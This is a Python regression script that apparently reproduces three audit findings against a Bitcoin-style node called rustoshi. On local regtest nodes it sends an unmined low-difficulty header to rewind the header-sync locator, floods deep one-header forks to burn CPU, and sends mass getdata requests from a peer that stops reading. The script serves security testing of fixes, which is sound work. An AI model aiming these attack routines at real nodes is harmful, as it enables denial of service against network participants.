#!/usr/bin/env python3
"""Regtest repro for security audit 2026-10-28 findings H2, H3, H4.

Starts a fresh rustoshi regtest node per scenario (fresh datadir under
--workdir, P2P on a free 127.0.0.1 port, no outbound peers, metrics off),
connects local attacker peers, and prints PASS/FAIL per scenario. Each
scenario FAILs on a node with the bug and PASSes on a fixed node.

  h2_unmined_header_rewind  Attacker is the header-sync peer, feeds a
                            2,000-header chain, then answers getheaders with
                            ONE unmined header on height 1 declaring nBits
                            0x03000001. A second peer's getheaders locator must
                            still start at our header tip (base: at height 1).
  h3_deep_fork_flood        Node mines 10,000 regtest blocks; a sync peer sends
                            300 valid one-header forks off the tip (control),
                            then 300 off height 1, one per handled message.
                            Deep forks must cost about the node CPU the shallow
                            control costs (base: an O(chain) index walk per
                            message).
  h4_getdata_flood          A peer that is not reading sends 10 getdata of
                            50,000 MSG_WITNESS_BLOCK items naming genesis. The
                            node must not read 500,000 blocks for it (counted
                            from its "Serving block" debug lines), and a reading
                            peer asking 100 copies must receive all 100.

Usage: sec_headers_getdata_regtest.py --bin PATH --workdir DIR [--only NAME]
Python 3 standard library only. Reuses the framing / node helpers in
sec_compact_blocks_regtest.py (same directory).
"""
import argparse
import base64
import json
import os
import random
import socket
import struct
import sys
import time
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from sec_compact_blocks_regtest import (  # noqa: E402
    GENESIS, Node, Peer, cs, frame, sha256d,
)

REGTEST_BITS = 0x207fffff
REGTEST_TARGET = 0x7fffff * (1 << (8 * (0x20 - 3)))
MSG_WITNESS_BLOCK = 0x40000002


class SyncPeer(Peer):
    """Peer that advertises `start_height` and can set a tiny receive buffer
    before connecting (so it can stop reading without the kernel absorbing
    megabytes of replies)."""

    def __init__(self, port, start_height=0, rcvbuf=None):
        if rcvbuf is None:
            super().__init__(port)
        else:
            self.s = socket.socket()
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
            self.s.settimeout(10)
            self.s.connect(("127.0.0.1", port))
            self.buf = b""
        # No Nagle: a headers + ping pair per round would otherwise wait on
        # the delayed ACK (~40 ms) and swamp what the node spends.
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.start_height = start_height
        self.frames = []  # (cmd, payload) of everything read

    def recv_frames(self, seconds, until=None):
        """Like recv_msgs but keeps payloads; stops early once `until`(cmd,
        payload) is true. Returns the new frames."""
        out = []
        end = time.time() + seconds
        while time.time() < end:
            self.s.settimeout(max(0.05, end - time.time()))
            try:
                d = self.s.recv(1 << 20)
            except socket.timeout:
                continue
            except OSError:
                out.append(("<closed>", b""))
                break
            if not d:
                out.append(("<closed>", b""))
                break
            self.buf += d
            done = False
            while len(self.buf) >= 24:
                ln = struct.unpack("<I", self.buf[16:20])[0]
                if len(self.buf) < 24 + ln:
                    break
                cmd = self.buf[4:16].rstrip(b"\0").decode()
                payload = self.buf[24:24 + ln]
                self.buf = self.buf[24 + ln:]
                out.append((cmd, payload))
                if cmd == "ping":
                    self.send("pong", payload)
                if until and until(cmd, payload):
                    done = True
            if done:
                break
        self.frames.extend(out)
        return out

    def handshake(self):
        addr = struct.pack("<Q", 0) + b"\0" * 10 + b"\xff\xff" + bytes([127, 0, 0, 1]) + struct.pack(">H", 0)
        ver = (struct.pack("<iQq", 70016, 9, int(time.time())) + addr + addr
               + struct.pack("<Q", random.getrandbits(64)) + cs(9) + b"/attack:0/"
               + struct.pack("<i", self.start_height) + b"\x01")
        self.send("version", ver)
        got = set()
        end = time.time() + 15
        while time.time() < end and "verack" not in got:
            for cmd, _ in self.recv_frames(0.5):
                got.add(cmd)
                if cmd == "version":
                    self.send("verack")
                if cmd == "<closed>":
                    raise RuntimeError("closed during handshake")
        if "verack" not in got:
            raise RuntimeError("no verack")

    def wait_getheaders(self, seconds=30):
        got = self.recv_frames(seconds, until=lambda c, _: c == "getheaders")
        for cmd, payload in got:
            if cmd == "getheaders":
                return parse_locator(payload)
        return None

    def ping_rtt(self, seconds=120):
        nonce = os.urandom(8)
        t0 = time.time()
        self.send("ping", nonce)
        got = self.recv_frames(seconds, until=lambda c, p: c == "pong" and p == nonce)
        if any(c == "pong" and p == nonce for c, p in got):
            return time.time() - t0
        return None


def parse_locator(payload):
    """getheaders payload -> list of block hashes (internal byte order)."""
    pos = 4
    n = payload[pos]
    pos += 1
    if n == 0xFD:
        n = struct.unpack("<H", payload[pos:pos + 2])[0]
        pos += 2
    return [payload[pos + 32 * i: pos + 32 * (i + 1)] for i in range(n)]


def mine(prev, timestamp, bits=REGTEST_BITS, salt=None):
    merkle = salt if salt is not None else os.urandom(32)
    nonce = 0
    while True:
        h = struct.pack("<i", 0x20000000) + prev + merkle + struct.pack("<III", timestamp, bits, nonce)
        if bits != REGTEST_BITS or int.from_bytes(sha256d(h), "little") <= REGTEST_TARGET:
            return h
        nonce += 1


def headers_msg(hdrs):
    return cs(len(hdrs)) + b"".join(h + b"\x00" for h in hdrs)


def build_chain(n):
    """n mined regtest headers on genesis; returns list (index i = height i+1)."""
    t0 = int(time.time()) - n - 7200
    out, prev = [], GENESIS
    for i in range(n):
        h = mine(prev, t0 + i)
        out.append(h)
        prev = sha256d(h)
    return out


def feed_chain(peer, chain):
    """Answer the node's getheaders with `chain` in 2000-header batches.
    Leaves `peer` as the active sync peer (the last batch is full, so the
    node asks for more). Returns the next locator."""
    assert len(chain) % 2000 == 0
    loc = peer.wait_getheaders()
    if loc is None:
        raise RuntimeError("node never sent getheaders to the sync peer")
    for i in range(0, len(chain), 2000):
        peer.send("headers", headers_msg(chain[i:i + 2000]))
        loc = peer.wait_getheaders(120)
        if loc is None:
            raise RuntimeError(f"no getheaders after batch {i // 2000}")
    return loc


def h2_unmined_header_rewind(node):
    chain = build_chain(2000)
    tip_hash = sha256d(chain[-1])
    a = SyncPeer(node.port, start_height=100000)
    a.handshake()
    loc = feed_chain(a, chain)
    if loc[0] != tip_hash:
        return False, f"setup: locator after the chain does not start at our tip ({loc[0][::-1].hex()})"
    # One unmined header on height 1, nBits 0x03000001 (target 1).
    attack = mine(sha256d(chain[0]), int(time.time()), bits=0x03000001)
    a.send("headers", headers_msg([attack]))
    after = a.recv_frames(3)
    a.close()
    time.sleep(1)
    b = SyncPeer(node.port, start_height=100000)
    b.handshake()
    loc_b = b.wait_getheaders(20)
    b.close()
    if loc_b is None:
        return False, "no getheaders to the second peer"
    first = loc_b[0]
    height = next((i + 1 for i, h in enumerate(chain) if sha256d(h) == first), 0 if first == GENESIS else -1)
    ok = node.alive() and first == tip_hash
    return ok, (f"attacker_replies={[c for c, _ in after][:6]} second_peer_locator_starts_at_height={height} "
                f"(our header tip=2000) node_alive={node.alive()}")


def rpc(node, method, params):
    """JSON-RPC call to the scenario node with its cookie."""
    for _ in range(120):
        try:
            with open(os.path.join(node.dir, ".cookie")) as f:
                cookie = f.read().strip()
            break
        except OSError:
            time.sleep(0.5)
    req = urllib.request.Request(
        f"http://127.0.0.1:{node.rpc}/",
        json.dumps({"jsonrpc": "1.0", "id": 1, "method": method, "params": params}).encode(),
        {"Authorization": "Basic " + base64.b64encode(cookie.encode()).decode(),
         "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=280) as r:
        return json.loads(r.read())["result"]


REGTEST_ADDR = "bcrt1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080"


def h3_deep_fork_flood(node, n_chain=10000, n_msgs=300):
    # Real blocks, so the chainstate tip is the header tip and the per-message
    # block-download enqueue that follows a headers reply is empty: what is
    # left to measure is the fork lookup + work compare.
    t_gen = time.time()
    for _ in range(n_chain // 1000):
        rpc(node, "generatetoaddress", [1000, REGTEST_ADDR])
    t_gen = time.time() - t_gen
    tip = rpc(node, "getblockcount", [])
    if tip != n_chain:
        return False, f"setup: chain height {tip} != {n_chain}"

    def block_hash(h):
        return bytes.fromhex(rpc(node, "getblockhash", [h]))[::-1]

    a = SyncPeer(node.port, start_height=10 ** 6)
    a.handshake()
    if a.wait_getheaders() is None:
        return False, "node never sent getheaders to the sync peer"
    now = int(time.time())
    log = open(os.path.join(node.dir, "node.log"), "rb")
    log.seek(0, os.SEEK_END)
    marker = b"Ignoring lighter/equal fork"

    def cpu_seconds():
        with open(f"/proc/{node.proc.pid}/stat") as f:
            fields = f.read().rsplit(")", 1)[1].split()
        return (int(fields[11]) + int(fields[12])) / os.sysconf("SC_CLK_TCK")

    def wait_handled(timeout=30):
        """Block until the node logs one more fork-compare verdict. The
        headers handler sends nothing back for a lighter fork, and a ping
        rides another event lane and overtakes it, so the node's own log
        line is the only in-order completion signal."""
        end = time.time() + timeout
        tail = b""
        while time.time() < end:
            chunk = log.read()
            if chunk:
                tail += chunk
                if marker in tail:
                    return True
                tail = tail[-len(marker):]
            else:
                time.sleep(0.0005)
        return False

    def flood(parent_height):
        # One header per round, waiting for the node to finish it, so every
        # message is handled (back-to-back headers overflow the peer's event
        # lane and most never reach the handler, which would measure nothing).
        parent = block_hash(parent_height)
        msgs = [frame("headers", headers_msg([mine(parent, now)])) for _ in range(n_msgs)]
        cpu0, t0 = cpu_seconds(), time.time()
        handled = 0
        for m in msgs:
            a.s.sendall(m)
            if not wait_handled():
                break
            handled += 1
        return cpu_seconds() - cpu0, time.time() - t0, handled

    sh_cpu, sh_wall, sh_n = flood(n_chain - 1)   # control: equal-work fork off the tip's parent
    dp_cpu, dp_wall, dp_n = flood(1)             # attack: lighter fork off height 1
    a.close()
    # Instrument check: every message in both phases reached the fork compare.
    ok = node.alive() and sh_n == n_msgs and dp_n == n_msgs and dp_cpu < 3 * sh_cpu + 0.5
    return ok, (f"chain={n_chain} (generated in {t_gen:.0f}s) msgs={n_msgs} "
                f"shallow_fork: cpu={sh_cpu:.2f}s wall={sh_wall:.2f}s handled={sh_n} | "
                f"deep_fork: cpu={dp_cpu:.2f}s wall={dp_wall:.2f}s handled={dp_n}")


def count_served(node):
    with open(os.path.join(node.dir, "node.log"), "rb") as f:
        return f.read().count(b"Serving block")


def h4_getdata_flood(node, n_msgs=10):
    inv = cs(50000) + (struct.pack("<I", MSG_WITNESS_BLOCK) + GENESIS) * 50000
    c = SyncPeer(node.port, rcvbuf=4096)
    c.handshake()
    before = count_served(node)
    t0 = time.time()
    for _ in range(n_msgs):
        c.s.sendall(frame("getdata", inv))
    # Not reading. A second peer's ping shows when the central loop is free.
    d = SyncPeer(node.port)
    d.handshake()
    rtt = d.ping_rtt(300)
    time.sleep(3)
    served = count_served(node) - before
    requested = n_msgs * 50000
    # Reading peer: 100 copies of genesis must all arrive.
    want = 100
    d.send("getdata", cs(want) + (struct.pack("<I", MSG_WITNESS_BLOCK) + GENESIS) * want)
    seen = [0]

    def enough(cmd, _payload):
        seen[0] += cmd == "block"
        return seen[0] >= want

    d.recv_frames(30, until=enough)
    blocks = seen[0]
    c.close()
    d.close()
    ok = node.alive() and served < requested // 5 and blocks == want
    rtt_s = f"{rtt:.2f}s" if rtt is not None else "none"
    return ok, (f"requested={requested} served_while_not_reading={served} "
                f"second_peer_ping_rtt={rtt_s} reading_peer_blocks={blocks}/{want} "
                f"elapsed={time.time() - t0:.1f}s")


SCENARIOS = {
    "h2_unmined_header_rewind": h2_unmined_header_rewind,
    "h3_deep_fork_flood": h3_deep_fork_flood,
    "h4_getdata_flood": h4_getdata_flood,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bin", required=True)
    ap.add_argument("--workdir", required=True)
    ap.add_argument("--only")
    args = ap.parse_args()
    os.makedirs(args.workdir, exist_ok=True)
    passed = failed = 0
    for name, fn in SCENARIOS.items():
        if args.only and name != args.only:
            continue
        node = Node(args.bin, args.workdir, name)
        try:
            ok, detail = fn(node)
        except Exception as e:  # noqa: BLE001 - report, keep going
            ok, detail = False, f"error: {e!r} node_alive={node.alive()}"
        finally:
            node.stop()
        print(f"{'PASS' if ok else 'FAIL'} {name}: {detail}", flush=True)
        passed += ok
        failed += not ok
    print(f"{passed} passed, {failed} failed")
    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
